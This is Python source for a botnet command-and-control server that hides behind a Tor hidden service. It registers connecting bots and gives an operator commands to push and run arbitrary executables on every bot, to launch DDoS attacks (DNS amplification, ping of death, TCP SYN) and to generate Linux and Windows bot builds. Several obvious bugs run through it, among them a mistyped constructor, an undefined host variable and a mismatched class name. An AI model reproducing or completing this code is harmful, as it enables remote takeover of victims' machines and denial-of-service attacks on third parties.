import socket
import os
import HiddenService 
from _thread import start_new_thread
from time import sleep
import Generator

class server:
    def __init__(self,port):
        self.port = port
        self.sock = socket.socket()
        h =HiddenService.HiddenService(port,"botnetservice")        
        self.addr = h.GetHostName()
        self.clients = {}

    def PrintHelpScreen(self):
        print("""
        ddos \t \t specify ddos type
        upload&exec \t \t upload a file and execute it (needs to be excutable)
        cpte \t \t complie python to executable to both os's 
        more to come...
        """)
    
    def PrintDDosHelpScreen():
        print("""
        dns amp
        POD 
        tcp syn
        more
        """)

    def StartServer(self):
        self.sock.bind((self.addr,self.port))
        self.sock.listen(5)
        start_new_thread(self.Handler,())
        while 1:            
            _ ,conn = self.sock.accept()
            recv = conn.recv(1024)
            remoteaddr = recv.split(' ')[0]
            macaddr = recv.split(' ')[1]
            c = client(remoteaddr,conn,macaddr)
            self.clients[recv] = c   
            print("recived new connection at addr: " + remoteaddr)
            sleep(0.5)

    def uploadfile(self,filename,conn):
        f= open(filename,'rb')
        l = f.read(1024)
        while (l):
            conn.send(l)
            l = f.read(1024)        

    def uandexec(self):
        linuxfname = input("enter linux file name")
        windowsfname = input("enter windows file name") 
        AmountOfClients = self.GetNumberOfClients()
        counter = 0
        for key,client in self.clients.items():
            print("\r uploading to bots: " + round((counter/AmountOfClients)*100) + "%")
            client.conn.send('upload&exec')
            if client.os == 'windows':
                self.uploadfile(windowsfname,client.conn)
            else:
                self.uploadfile(linuxfname,client.conn)
            client.conn.send('exec')
            counter +=1

    def GetNumberOfClients(self):
        counter = 0
        for key , client in self.clients:
            counter += 1
        return counter

    def ddoshandler(self,cmd):
        victim = cmd.split(' ')[2]
        type = cmd.split(' ')[1]
        if os.system("ping -c 1 " + SOMEHOST) == 0:
            print("[+] host is up starting the attack")
        else:
            print("[!] host "+ victim +" is not up no reasom to ddos him ?")
            return None        
        for key,client in self.clients:
            client.conn.send(cmd)
        

    def Handler(self):
        while 1:
            cmd = input("botnet_controller>")
            if cmd == "help":
                self.PrintHelpScreen()
            if cmd == "ddos help":
                self.PrintDDosHelpScreen()
            if cmd == "Upload&exec":
                self.uandexec()
            if cmd == "Compile":
                linux = Generator.Generator('~/botnet/LinuxBot.py',self.port,self.addr,'Linux.py',opts={'compile':False})
                windows = Generator.Generator('~/botnet/WindowsBot.py',self.port,self.addr,'Windows.py',opts={'compile':False})
                Generator.compiler('Linux.py','~/','linux')
                Generator.compiler('Windows.py','~/','windows')
            if cmd.startswith('ddos'):
                self.ddoshandler(cmd)

   

class Client():
    def __init_(self,addr,conn,mac):
        self.addr = addr
        self.mac = mac
        self.conn = conn
        self.id = addr + " " + mac
        self.os = self.GetOs()

    #privete methods:
    def GetOs(self):
        self.conn.send('os')
        return conn.recv(1024)